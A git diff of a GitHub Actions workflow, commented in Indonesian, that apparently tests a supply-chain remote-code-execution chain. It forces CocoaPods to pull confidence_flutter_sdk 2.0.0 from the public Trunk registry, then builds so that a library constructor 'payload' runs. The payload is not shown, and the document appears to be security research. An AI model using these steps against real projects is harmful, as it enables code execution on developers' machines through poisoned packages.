@@ -12,6 +12,7 @@ jobs:
 
       - name: Execute Full RCE Chain
         run: |
+          # 1. Create dummy project
           flutter create rce_test
           cd rce_test
           flutter pub add confidence_flutter_sdk
@@ -19,22 +20,25 @@ jobs:
           echo "=== Podfile content BEFORE manual patch ==="
           cat ios/Podfile
           
-          # 1. Patch Platform Version (Work as intended)
+          # 2. Patch Platform Version ke 16.0 (Sinkron dengan podspec)
           sed -i '' '1s/^/platform :ios, '"'"'16.0'"'"'\n/' ios/Podfile
           
-          # 2. HAPUS blok target otomatis agar tidak menggunakan symlink lokal (:path)
-          # Kita hapus baris 'flutter_install_all_ios_pods' yang isinya symlink otomatis
-          # Lalu kita tambahkan deklarasi pod secara manual tanpa :path agar tarik dari Trunk
+          # 3. KILL Local Path Shadowing
+          # Kita hapus logic otomatis Flutter yang maksa pake symlink lokal (:path)
           sed -i '' '/flutter_install_all_ios_pods/d' ios/Podfile
+          
+          # Paksa CocoaPods cari ke Global Registry (Trunk) untuk versi 2.0.0
           echo "pod 'confidence_flutter_sdk'" >> ios/Podfile
           
           echo "=== Podfile AFTER manual patch (Local Path Removed) ==="
           cat ios/Podfile
           
           cd ios
+          # Mastiin mesin GHA punya list terbaru dari CDN
           pod repo update
           
-          # 3. Pod Install (Sekarang harusnya narik v1.2.6 dari Trunk)
+          # 4. Pod Install - Resolution Phase
+          # Di sini log harus nunjukin "Installing confidence_flutter_sdk 2.0.0"
           pod install --verbose 2>&1 | tee pod_install.log || true
           
           echo "=== pod install result ==="
@@ -42,8 +46,11 @@ jobs:
           cat Podfile.lock 2>/dev/null || echo "Podfile.lock not generated"
           
           cd ..
-          # 4. Build Phase (Triggering Payload)
+          # 5. Build Phase - Execution Phase
+          # dyld akan meload library dan mentrigger Objective-C Constructor lu
           flutter build ios --no-codesign 2>&1 | tee build.log || true
+          
+          echo "=== Build log tail ==="
           tail -20 build.log
 
       - name: Upload Logs
